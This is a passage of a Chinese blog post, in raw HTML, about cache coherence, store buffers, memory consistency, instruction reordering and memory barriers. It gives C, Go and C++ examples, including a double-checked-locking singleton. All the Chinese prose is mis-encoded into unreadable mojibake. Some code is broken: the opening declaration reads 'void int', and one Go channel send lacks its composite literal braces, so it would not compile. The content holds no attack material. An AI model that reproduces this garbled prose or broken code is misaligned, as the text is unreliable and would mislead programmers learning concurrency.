class="keyword">void</span> <span class="keyword">int</span> <span class="title">thread_cpu1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        y = <span class="number">1</span>;    <span class="comment">/* C */</span></span><br><span class="line">        r2 = x;   <span class="comment">/* D */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">check_after_assign</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;r1 = %d, r2 = %d\n&quot;</span>, r1, r2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡è®¾ thread_cpu0 åœ¨ CPU0 ä¸Šæ‰§è¡Œï¼Œthread_cpu1 åœ¨ CPU1 ä¸Šæ‰§è¡Œã€‚åœ¨å¤šæ ¸ç³»ç»Ÿä¸Šï¼Œæˆ‘ä»¬çŸ¥é“ä¸¤ä¸ªå‡½æ•° 4 æ¡æ“ä½œæ‰§è¡Œå¯ä»¥äº’ç›¸äº¤é”™ã€‚ç†è®ºä¸Šæ¥æˆ‘ä»¬æœ‰ä»¥ä¸‹ 6 ç§ç»„åˆï¼Œ3 ç§ç»“æœï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A-&gt;B-&gt;C-&gt;D</span><br><span class="line">A-&gt;C-&gt;B-&gt;D</span><br><span class="line">A-&gt;C-&gt;D-&gt;B</span><br><span class="line">C-&gt;D-&gt;A-&gt;B</span><br><span class="line">C-&gt;A-&gt;D-&gt;B</span><br><span class="line">C-&gt;A-&gt;B-&gt;D</span><br><span class="line"></span><br><span class="line">r1 = 1, r2 = 1</span><br><span class="line">r1 = 0, r2 = 1</span><br><span class="line">r1 = 1, r2 = 0</span><br></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬è€ƒè™‘ store buffer æ—¶ï¼Œä¼šæ˜¯æ€æ ·çš„ç»“æœå‘¢ï¼Ÿæˆ‘ä»¬å°±ä»¥ A-&gt;C-&gt;B-&gt;D çš„æ‰§è¡Œæ¬¡åºè¯´æ˜é—®é¢˜ã€‚å½“ CPU0 æ‰§è¡Œ <code>x = 1</code> æ—¶ï¼Œxçš„å€¼ä¼šè¢«å†™å…¥ CPU0 çš„ store bufferã€‚CPU1 æŒ‡ä»¤ <code>y = 1</code> æ“ä½œï¼ŒåŒæ · y çš„å€¼ä¼šè¢«å†™å…¥ CPU1 çš„ store bufferã€‚æ¥ä¸‹æ¥ï¼ŒCPU0 æ‰§è¡Œ <code>r1 = y</code> è¯»å– y çš„å€¼ï¼Œç”±äº y çš„æ–°å€¼ä¾ç„¶åœ¨ CPU1 çš„ store buffer é‡Œé¢ï¼Œæ‰€ä»¥ CPU0 çœ‹åˆ° y çš„å€¼ä¾ç„¶æ˜¯ 0ã€‚æ‰€ä»¥ r1 çš„å€¼æ˜¯ 0ã€‚ä¸ºä»€ä¹ˆ CPU0 çœ‹åˆ° r1 çš„å€¼æ˜¯ 0 å‘¢ï¼Ÿå› ä¸º MESI åªä¿è¯ç¼“å­˜ä¸€è‡´æ€§ï¼Œè€Œå¦‚æœå€¼æ²¡æœ‰è¢«å†™å…¥ Cache(ä¾ç„¶èººåœ¨ store buffer é‡Œé¢)ï¼ŒMESI å°±ç®¡ä¸ç€ã€‚åŒæ ·çš„é“ç†ï¼Œr2 çš„å€¼ä¹Ÿä¼šæ˜¯ 0ã€‚</p>
<p>By the wayï¼Œè™½ç„¶ store buffer ä¸»è¦æ˜¯ç”¨æ¥ç¼“å­˜ CPU çš„å†™æ“ä½œï¼Œä½†æ˜¯ CPU è¯»å–æ•°æ®æ—¶ä¹Ÿä¼šæ£€æŸ¥ç§æœ‰ store buffer æ˜¯å¦å‘½ä¸­ï¼Œå¦‚æœæ²¡æœ‰å‘½ä¸­æ‰ä¼šæŸ¥æ‰¾ L1 Cacheã€‚è¿™ä¸»è¦æ˜¯ä¸ºäº† CPU è‡ªå·±çœ‹åˆ°è‡ªå·±å†™è¿› store buffer çš„å€¼ï¼Œæ‰€ä»¥ CPU0 å¯ä»¥çœ‹åˆ° x å€¼æ›´æ–°ã€‚</p>
<h2 id="å†…å­˜ä¸€è‡´æ€§-Memory-Consistency"><a href="#å†…å­˜ä¸€è‡´æ€§-Memory-Consistency" class="headerlink" title="å†…å­˜ä¸€è‡´æ€§(Memory Consistency)"></a>å†…å­˜ä¸€è‡´æ€§(Memory Consistency)</h2><p>å†…å­˜ä¸€è‡´æ€§å…³æ³¨çš„æ˜¯å¤šä¸ª CPU å¯¹å†…å­˜ä¸­å¤šæ¡æŒ‡ä»¤çš„æ‰§è¡Œé¡ºåºã€‚åˆ°ç›®å‰ä¸ºæ­¢æˆ‘ä»¬åªè€ƒè™‘äº† CPU æŒ‰ç…§ç¨‹åºé¡ºåºæ‰§è¡ŒæŒ‡ä»¤ï¼Œè€Œå®é™…ä¸Šä¸ºäº†æ›´å¥½åœ°åˆ©ç”¨ CPUï¼ŒCPU å’Œç¼–è¯‘å™¨éƒ½å¯èƒ½ä¼šå¯¹æŒ‡ä»¤è¿›è¡Œé‡æ’(reordering)ï¼š</p>
<ul>
<li>ç¼–è¯‘æœŸé—´é‡æ’: ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æœŸé—´ï¼Œå¯èƒ½å¯¹æŒ‡ä»¤è¿›è¡Œé‡æ’ï¼Œä»¥ä½¿å…¶å¯¹ CPU æ›´å‹å¥½</li>
<li>è¿è¡ŒæœŸé—´é‡æ’: CPU åœ¨æ‰§è¡ŒæŒ‡ä»¤çš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½ä¹±åºæ‰§è¡Œä»¥æ›´å¥½åœ°åˆ©ç”¨æµæ°´çº¿</li>
</ul>
<p>ä»¥ä¸‹ä»£ç æ— æ³•ä¿è¯ A1 ä¸€å®šåœ¨ A2 ä¹‹å‰æ‰§è¡Œï¼ŒåŒæ ·ä¹Ÿæ— æ³•ä¿è¯ B1 ä¸€å®šåœ¨ B2 ä¹‹å‰æ‰§è¡Œã€‚å› ä¸ºèµ‹å€¼è¯­å¥å’Œè¾“å‡ºè¯­å¥å¯¹åº”ä¸åŒå˜é‡ï¼Œç¼–è¯‘å™¨å¯èƒ½è®¤ä¸ºè¿™ä¸¤ä¸ªè¯­å¥çš„æ‰§è¡Œé¡ºåºæ˜¯ä¸é‡è¦çš„ï¼Œæ‰€ä»¥ç§è‡ªè¿›è¡Œäº†æŒ‡ä»¤é‡æ’ï¼ŒåŒç† CPU æŒ‡ä»¤æµæ°´æœŸé—´ä¹Ÿå¯èƒ½å‘ç”Ÿé‡æ’ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä»£ç äºŒ</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x, y <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        x = <span class="number">1</span>   <span class="comment">// A1</span></span><br><span class="line">        fmt.Print(<span class="string">&quot;y=&quot;</span>, y, <span class="string">&quot; &quot;</span>) <span class="comment">// A2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        y = <span class="number">2</span>   <span class="comment">// B1</span></span><br><span class="line">        fmt.Print(<span class="string">&quot;x=&quot;</span>, x, <span class="string">&quot; &quot;</span>) <span class="comment">// B2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    &lt;- done</span><br><span class="line">    &lt;- done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>é¡ºåºä¸€è‡´æ€§ï¼ˆSequential consistencyï¼‰</code>ä¿è¯æ‰€æœ‰æ“ä½œå¿…é¡»æŒ‰ç…§ä»£ç ç¼–å†™çš„é¡ºåºæ¥æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸Šé¢çš„çš„ä»£ç æ»¡è¶³é¡ºåºä¸€è‡´æ€§ï¼Œå°±ä¸ä¼šå‡ºç°â€œåé¢çš„æŒ‡ä»¤åè€Œæ”¾åˆ°å‰é¢æ¥æ‰§è¡Œâ€çš„æƒ…å†µäº†ã€‚ç°ä»£ CPU ä¸ºäº†æ”¯æŒæŒ‡ä»¤é‡æ’ä»¥æé«˜æ‰§è¡Œæ•ˆç‡ï¼Œå¾€å¾€åªæ»¡è¶³â€œæ— æ•°æ®ç«äº‰ç¨‹åºçš„é¡ºåºä¸€è‡´æ€§â€ï¼Œå³å¯¹æ²¡æœ‰ data race çš„ç¨‹åºæ¥è¯´ï¼Œæ˜¯æ»¡è¶³é¡ºåºä¸€è‡´æ€§çš„(ç¼–è¯‘å™¨èƒ½å¤Ÿåˆ†æä¸Šä¸‹æ–‡ç›¸å…³æ€§)ï¼Œä½†æ˜¯åœ¨å¹¶å‘ç¯å¢ƒä¸‹ï¼Œéœ€è¦ç¨‹åºå‘˜é€šè¿‡æŒ‡ä»¤æ‰‹åŠ¨å»é™åˆ¶æŒ‡ä»¤é‡æ’ä»¥æ»¡è¶³é¡ºåºä¸€è‡´æ€§ã€‚</p>
<p>è¿™é‡Œå†ç»™å‡ºä¸€ä¸ªçœŸå®ä¸–ç•Œé‡Œç”±äºæŒ‡ä»¤é‡æ’å¯¼è‡´ bug çš„ä¾‹å­ï¼Œå¾ˆé•¿ä¸€æ®µæ—¶é—´é‡Œè¿™ä¸ªç¤ºä¾‹è¢«è®¤ä¸ºæ˜¯æ­£ç¡®çš„ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">Singleton* <span class="title">Singleton::getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//å…ˆåˆ¤æ–­æ˜¯ä¸æ˜¯åˆå§‹åŒ–äº†ï¼Œå¦‚æœåˆå§‹åŒ–è¿‡ï¼Œå°±å†ä¹Ÿä¸ä¼šä½¿ç”¨é”äº†</span></span><br><span class="line">    <span class="keyword">if</span>(m_instance == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        Lock; <span class="comment">//ä¼ªä»£ç </span></span><br><span class="line">        <span class="keyword">if</span> (m_instance == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            m_instance = <span class="keyword">new</span> <span class="built_in">Singleton</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> m_instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ®µå•ä¾‹æ¨¡å¼çš„ä»£ç çœ‹èµ·æ¥æ²¡é—®é¢˜ã€‚è®¾æƒ³ç°åœ¨æœ‰çº¿ç¨‹ A å’Œçº¿ç¨‹ B åŒæ—¶æ‰§è¡Œ <code>Singleton::getInstance()</code>ï¼ŒA ç‡å…ˆå¾—åˆ°é”è¿›å…¥ä¸´ç•ŒåŒºæ‰§è¡Œ <code>m_instance = new Singleton();</code>ï¼Œè¿™å¥ä»£ç åˆ†ä¸º 3 æ­¥æ‰§è¡Œï¼š</p>
<ol>
<li>ç”³è¯·ä¸€å—å†…å­˜ç©ºé—´</li>
<li>åœ¨ç”³è¯·åˆ°çš„å†…å­˜ä¸Šåˆ›å»ºä¸€ä¸ª Singleton å¯¹è±¡</li>
<li>æŠŠå†…å­˜åœ°å€èµ‹ç»™ m_instance</li>
</ol>
<p>äº‹å®ä¸ŠæŒ‡ä»¤æ‰§è¡Œé¡ºåºå¯èƒ½æ˜¯ 1-&gt;3-&gt;2ï¼ŒA æ‰§è¡Œå®Œ 3 ä»¥å m_instance å°±ä¸å†æ˜¯ nullptrï¼Œè€Œ 2 å°šæœªæ‰§è¡Œå³ Singleton å¯¹è±¡æœªåˆ›å»ºï¼Œæ­¤æ—¶ B æ£€æŸ¥ m_instance ä¼šå¾—åˆ° false ç›´æ¥ return m_instance å¯¼è‡´ bugã€‚</p>
<h2 id="ç¼“å­˜ä¸€è‡´æ€§å’Œå†…å­˜ä¸€è‡´æ€§çš„åŒºåˆ«"><a href="#ç¼“å­˜ä¸€è‡´æ€§å’Œå†…å­˜ä¸€è‡´æ€§çš„åŒºåˆ«" class="headerlink" title="ç¼“å­˜ä¸€è‡´æ€§å’Œå†…å­˜ä¸€è‡´æ€§çš„åŒºåˆ«"></a>ç¼“å­˜ä¸€è‡´æ€§å’Œå†…å­˜ä¸€è‡´æ€§çš„åŒºåˆ«</h2><p>ç¼“å­˜ä¸€è‡´æ€§ä¸»è¦è€ƒè™‘å¯¹äºåŒä¸€å†…å­˜ä½ç½®çš„å†™æ“ä½œå¯¹äºæ‰€æœ‰çš„å¤„ç†å™¨çš„å¯è§æ€§ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›å†™å†…å­˜çš„ç»“æœå¯ä»¥ç«‹å³è¢«æ‰€æœ‰å¤„ç†å™¨çœ‹åˆ°ï¼Œä¹Ÿå°±æ˜¯è¯´å†™æ“ä½œåå…¶å®ƒå¤„ç†å™¨çš„è¯»æ“ä½œæ‰€è¯»åˆ°çš„å€¼éƒ½æ˜¯æ–°å€¼ã€‚ä½†äº‹å®ä¸Šï¼Œç”±äºå±‚æ¬¡å­˜å‚¨æ¨¡å‹çš„å­˜åœ¨ï¼Œè¿™æ ·çš„å‡è®¾ç”±äºå¤ªå¼ºä¸å¯èƒ½å®ç°ã€‚</p>
<p>å†…å­˜ä¸€è‡´æ€§å…³æ³¨å¯¹å¤šä¸ªå†…å­˜åŒºåŸŸçš„è®¿é—®ï¼ˆè¯»å’Œå†™ï¼‰çš„é¡ºåºã€‚å½“ç„¶ï¼Œæœ€ç†æƒ³çš„æƒ…å†µå°±æ˜¯æ‰€æœ‰æŒ‡ä»¤çš„æ‰§è¡Œé¡ºåºå’Œç¨‹åºé‡Œå†™çš„ä¸€æ¨¡ä¸€æ ·ï¼ˆå³æ»¡è¶³é¡ºåºä¸€è‡´æ€§ï¼‰ï¼Œä½†äº‹å®ä¸Šè¿™ä¹Ÿæ˜¯ä¸å¯èƒ½çš„ã€‚å› ä¸ºè€ƒè™‘åˆ°å¹¶è¡Œä¼˜åŒ–ï¼Œå‡ ä¹æ‰€æœ‰å¹³å°éƒ½ä¼šæ”¹å˜æŒ‡ä»¤é¡ºåºæ¥æé«˜ç¨‹åºè¿è¡Œé€Ÿåº¦ï¼Œè¿™ä¸å¯é¿å…åœ°ä¼šè¿åä¸€è‡´æ€§åŸåˆ™ã€‚å‰é¢æåˆ°å†…å­˜è®¿é—®åˆ†ä¸¤ç§ï¼šè¯»å’Œå†™ï¼Œåˆ™<strong>è¿åå†…å­˜ä¸€è‡´æ€§åŸåˆ™çš„æƒ…å†µå¯èƒ½æœ‰ 4 ç§ï¼šLoadLoadï¼ŒLoadStoreï¼ŒStoreStore å’Œ StoreLoad</strong>ã€‚è¿‡å¼ºçš„ä¸€è‡´æ€§çº¦æŸä¼šä½¿ä¼˜åŒ–ç¨‹åº¦æå¤§é™ä½ï¼Œå› æ­¤å¾ˆå¤šå¹³å°ä¼šé€‰æ‹©æ”¾å¼ƒå…¶ä¸­çš„ä¸€ç§æˆ–å‡ ç§ã€‚</p>
<h2 id="ä»€ä¹ˆåŸå› ä¼šå¯¼è‡´ä¹±åºï¼Ÿ"><a href="#ä»€ä¹ˆåŸå› ä¼šå¯¼è‡´ä¹±åºï¼Ÿ" class="headerlink" title="ä»€ä¹ˆåŸå› ä¼šå¯¼è‡´ä¹±åºï¼Ÿ"></a>ä»€ä¹ˆåŸå› ä¼šå¯¼è‡´ä¹±åºï¼Ÿ</h2><ol>
<li>Store Buffer å¯è§æ€§å¯¼è‡´çš„â€ä¼ªÂ·ä¹±åºâ€ã€‚å†™å…¥ Store Buffer çš„æ•°æ®æ²¡æœ‰åŠæ—¶åˆ·æ–°åˆ°å†…å­˜ã€‚</li>
<li>ç¼–è¯‘å™¨ã€CPU æŒ‡ä»¤é‡æ’å¯¼è‡´çš„â€çœŸÂ·ä¹±åºâ€ã€‚å³åé¢çš„æŒ‡ä»¤çœŸçš„è·‘åˆ°å‰é¢å»æ‰§è¡Œäº†ã€‚</li>
</ol>
<h2 id="å†…å­˜å±éšœ"><a href="#å†…å­˜å±éšœ" class="headerlink" title="å†…å­˜å±éšœ"></a>å†…å­˜å±éšœ</h2><p>é™åˆ¶ç¼–è¯‘å™¨å’Œ CPU è¿›è¡ŒæŒ‡ä»¤é‡æ’çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨<strong>å†…å­˜å±éšœï¼ˆMemory Barrierï¼‰</strong>ï¼Œåˆç§°<strong>å†…å­˜æ …æ ï¼ˆMemory Fenceï¼‰</strong>ï¼Œå®ƒæ˜¯ç¨‹åºå‘˜è§£å†³ä¹±åºé—®é¢˜çš„å¤§æ€å™¨ã€‚å†…å­˜å±éšœèµ·åˆ°ä¸¤ä¸ªä½œç”¨ï¼š</p>
<ol>
<li>å¼ºåˆ¶åˆ·æ–° store bufferã€‚è¿™æ ·å†…å­˜å±éšœä¹‹å‰çš„æ‰€æœ‰å†™æ“ä½œå¯¹å±éšœä¹‹åçš„æŒ‡ä»¤éƒ½æ˜¯å¯è§çš„ã€‚</li>
<li>é˜»æ­¢æ­¤å¤„çš„æŒ‡ä»¤é‡æ’ã€‚å®ƒåé¢çš„æŒ‡ä»¤ä¸ä¼šä¹±åºåˆ°å‰é¢æ‰§è¡Œï¼Œå°±åƒæ˜¯ä¸ªå±éšœä¸€æ ·ï¼Œä¸å®¹é€¾è¶Šã€‚</li>
</ol>
<p>å¯¹äºä¸Šæ–‡ä»£ç äºŒï¼Œåˆ©ç”¨â€œç®¡é“æ“ä½œâ€è¿™ä¸€åŒæ­¥åŸè¯­è¿›è¡ŒåŒæ­¥ä»¥åï¼Œå°±èƒ½å¤Ÿä¿è¯ A1 ä¸ A2ï¼ŒB1 ä¸ B2 çš„æ‰§è¡Œé¡ºåºäº†ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä»£ç ä¸‰</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x, y <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"><span class="keyword">var</span> ok = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        x = <span class="number">1</span>   <span class="comment">// A1</span></span><br><span class="line">        ok &lt;- <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">        fmt.Print(<span class="string">&quot;y=&quot;</span>, y, <span class="string">&quot; &quot;</span>) <span class="comment">// A2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        y = <span class="number">2</span>   <span class="comment">// B1</span></span><br><span class="line">        &lt;-ok</span><br><span class="line">        fmt.Print(<span class="string">&quot;x=&quot;</span>, x, <span class="string">&quot; &quot;</span>) <span class="comment">// B2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    &lt;- done</span><br><span class="line">    &lt;- done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®é™…çš„ CPU æ¶æ„ä¸­ï¼Œå¯èƒ½æä¾›å¤šç§å†…å­˜å±éšœï¼Œæ¯”å¦‚å¯èƒ½åˆ†ä¸ºå››ç§:</p>
<table>
<thead>
<tr>
<th>å±éšœç±»å‹</th>
<th>æŒ‡ä»¤ç¤ºä¾‹</th>
<th>è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td>Load-Load</td>
<td>Load1; Load-Load; Load2;</td>
<td>Load1 å…ˆäº Load2 åŠå…¶åæ‰€æœ‰ Load æŒ‡ä»¤æ‰§è¡Œ</td>
</tr>
<tr>
<td>Store-Store</td>
<td>Store1; Store-Store; Store2;</td>
<td>Store1 å…ˆäº Store2 åŠå…¶åæ‰€æœ‰ Store æŒ‡ä»¤æ‰§è¡Œï¼Œå¹¶ä¿è¯ Store1 çš„ç»“æœç«‹åˆ»è¢«åˆ·æ–°åˆ°å†…å­˜</td>
</tr>
<tr>
<td>Load-Store</td>
<td>Load1; Load-Store; Store1;</td>
<td>Load1 å…ˆäº Store1 åŠå…¶åæ‰€æœ‰ Store æŒ‡ä»¤æ‰§è¡Œ</td>
</tr>
<tr>
<td>Store-Load</td>
<td>Store1; Store-Load; Load1;</td>
<td>ä¿è¯è¯¥å±éšœä¹‹å‰çš„æ‰€æœ‰å†…å­˜è®¿é—®æŒ‡ä»¤ï¼ˆStore å’Œ Loadï¼‰éƒ½å®Œæˆå¹¶åˆ·æ–°åˆ°å†…å­˜ï¼Œå†æ‰§è¡Œè¯¥å±éšœä¹‹åçš„å†…å­˜è®¿é—®æŒ‡ä»¤</td>
</tr>
</tbody></table>
<p>å…¶ä¸­ Store-Load å±éšœæ˜¯ä¿è¯æ€§æœ€å¼ºçš„ï¼Œä¹Ÿæ˜¯å¼€é”€æœ€å¤§çš„ï¼Œæ‰€ä»¥éƒ¨åˆ† CPU è¿›è¡ŒæŒ‡ä»¤é‡æ’æ—¶èƒ½ä¿è¯æ»¡è¶³å‰ä¸‰ç§è¦æ±‚ï¼Œä½†æ˜¯ Store-Load éœ€è¦ç¨‹åºå‘˜æ‰‹åŠ¨åˆ©ç”¨å±éšœä¿è¯ã€‚åœ¨ x86 æ¶æ„å¤„ç†å™¨çš„æŒ‡ä»¤é›†ä¸­ï¼Œ<code>lock</code> æŒ‡ä»¤å¯ä»¥è§¦å‘ Store-Load å±éšœã€‚</p>
<p>å€ŸåŠ© C++11 çš„æ–°ç‰¹æ€§ atomicï¼Œæ”¹è¿›ä¸Šé¢æåˆ°çš„å•ä¾‹æ¨¡å¼ä»£ç ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">std::atomic&lt;Singleton*&gt; Singleton::m_instance;</span><br><span class="line">std::mutex Singleton::m_mutex;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* std::atomic_thread_fence(std::memory_order_acquire); </span></span><br><span class="line"><span class="comment">* std::atomic_thread_fence(std::memory_order_release);</span></span><br><span class="line"><span class="comment">* è¿™ä¸¤å¥è¯å¯ä»¥ä¿è¯ä»–ä»¬ä¹‹é—´çš„è¯­å¥ä¸ä¼šå‘ç”Ÿä¹±åºæ‰§è¡Œã€‚</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">Singleton* <span class="title">Singleton::getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Singleton* tmp = m_instance.<span class="built_in">load</span>(std::memory_order_relaxed);</span><br><span class="line">    std::<span class="built_in">atomic_thread_fence</span>(std::memory_order_acquire);  <span class="comment">//è·å–å†…å­˜fence</span></span><br><span class="line">    <span class="keyword">if</span> (tmp == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(m_mutex)</span></span>;</span><br><span class="line">        tmp = m_instance.<span class="built_in">load</span>(std::memory_order_relaxed);</span><br><span class="line">        <span class="keyword">if</span> (tmp == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            tmp = <span class="keyword">new</span> Singleton;</span><br><span class="line">            std::<span class="built_in">atomic_thread_fence</span>(std::memory_order_release);  <span class="comment">//é‡Šæ”¾å†…å­˜fence</span></span><br><span class="line">            m_instance.<span class="built_in">store</span>(tmp, std::memory_order_relaxed);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®å¯¹å†…å­˜ä¸€è‡´æ€§çš„çš„æ”¯æŒä¸åŒï¼Œå¤„ç†å™¨è¢«åˆ’åˆ†ä¸ºå‡ ç§ä¸åŒçš„å†…å­˜æ¨¡å‹ï¼š</p>
<ul>
<li>å¼±å†…å­˜æ¨¡å‹ï¼šå¦‚ DEC Alphaã€‚åªè¦å…¶ä¸æ”¹å˜å•çº¿ç¨‹çš„è¡Œä¸ºï¼Œå¯èƒ½å‘ç”Ÿå…¨éƒ¨å››ç§ä¹±åºã€‚</li>
<li>å¼ºå†…å­˜æ¨¡å‹ï¼šå¦‚ X86/64ã€‚å®ƒé¿å…äº†å››ç§ä¹±åºä¸­çš„ä¸‰ç§ï¼Œä½†ä»ç„¶ä¿ç•™ Store-Load é‡æ’ï¼Œè¿™ç§æƒ…å†µéœ€è¦ç¨‹åºå‘˜æ‰‹åŠ¨æ’å…¥å±éšœæ¥ç¡®ä¿ç¨‹åºæ­£ç¡®ã€‚</li>
<li>é¡ºåºä¸€è‡´æ€§æ¨¡å‹ï¼šæœ€å¼ºçš„ä¸€è‡´æ€§ï¼Œç†æƒ³ä¸­çš„æ¨¡å‹ï¼Œåœ¨è¿™ç§å†…å­˜æ¨¡å‹ä¸­ï¼Œæ²¡æœ‰ä¹±åºçš„å­˜åœ¨ã€‚å¦‚ä»Šå¾ˆéš¾æ‰¾åˆ°ä¸€ä¸ªç¡¬ä»¶ä½“ç³»ç»“æ„æ”¯æŒé¡ºåºä¸€è‡´æ€§ï¼Œå› ä¸ºå®ƒä¼šä¸¥é‡é™åˆ¶ç¡¬ä»¶å¯¹ CPU æ‰§è¡Œæ•ˆç‡çš„ä¼˜åŒ–ã€‚</li>
</ul>
<h2 id="ä»€ä¹ˆæ—¶å€™éœ€è¦è€ƒè™‘ä¸€è‡´æ€§ï¼Ÿ"><a href="#ä»€ä¹ˆæ—¶å€™éœ€è¦è€ƒè™‘ä¸€è‡´æ€§ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ—¶å€™éœ€è¦è€ƒè™‘ä¸€è‡´æ€§ï¼Ÿ"></a>ä»€ä¹ˆæ—¶å€™éœ€è¦è€ƒè™‘ä¸€è‡´æ€§ï¼Ÿ</h2><ol>
<li>æ˜¯å¦æœ‰å…±äº«æ•°æ®ï¼Ÿç§æœ‰æ•°æ®ä¸å­˜åœ¨ç«äº‰ï¼Œä¹Ÿå°±ä¸å­˜åœ¨ä¸€è‡´æ€§çš„é—®é¢˜</li>
<li>å…±äº«æ•°æ®æ˜¯å¦å¯èƒ½è¢«å¤šä¸ª CPU å¹¶è¡Œè®¿é—®ï¼Ÿå¦‚æœåªæœ‰ä¸€ä¸ª CPU ä¼šè®¿é—®å…±äº«æ•°æ®ï¼ˆåŒ…æ‹¬è¯»å†™ï¼‰ï¼Œä¹Ÿä¸éœ€è¦è€ƒè™‘ä¸€è‡´æ€§é—®é¢˜</li>
<li>æ˜¯å¦æœ‰å¤šä¸ªå…±äº«æ•°æ®ï¼Ÿå¤šä¸ªæ•°æ®ä¹‹é—´çš„è¯»å†™è®¿é—®ï¼Œæ˜¯å¦éœ€è¦ä¿è¯ä¸€å®šçš„æ¬¡åºï¼Ÿå¦‚æœéœ€è¦ä¿è¯æ¬¡åºï¼Œå°±éœ€è¦è€ƒè™‘ä¹±åºã€‚å¦‚æœä¸ care è®¿é—®æ¬¡åºï¼Œé‚£å°±æ²¡å¿…è¦è€ƒè™‘ä¹±åºã€‚</li>
</ol>
<p>å¯¹å¼€å‘è€…è€Œè¨€ï¼Œ<strong>ç¼–å†™å¹¶å‘ç¨‹åºéœ€è¦å…³æ³¨ä¸‰ä¸ªä¸œè¥¿: åŸå­æ€§ï¼Œå¯è§æ€§å’Œé¡ºåºæ€§</strong>ï¼š</p>
<ul>
<li>åŸå­æ€§: å°½ç®¡åœ¨å¦‚ä»Šå¤§éƒ¨åˆ†å¹³å°ä¸‹ï¼Œå¯¹ä¸€ä¸ªå­—çš„æ•°æ®è¿›è¡Œå­˜å–(int,æŒ‡é’ˆ)çš„æ“ä½œæœ¬èº«å°±æ˜¯åŸå­æ€§çš„ï¼Œä½†ä¸ºäº†æ›´å¥½åœ°è·¨å¹³å°æ€§ï¼Œé€šè¿‡ atomic æ“ä½œæ¥å®ç°åŸå­æ€§æ˜¯æ›´å¥½çš„æ–¹æ³•ï¼Œå¹¶ä¸”ä¸ä¼šé€ æˆé¢å¤–çš„å¼€é”€ã€‚</li>
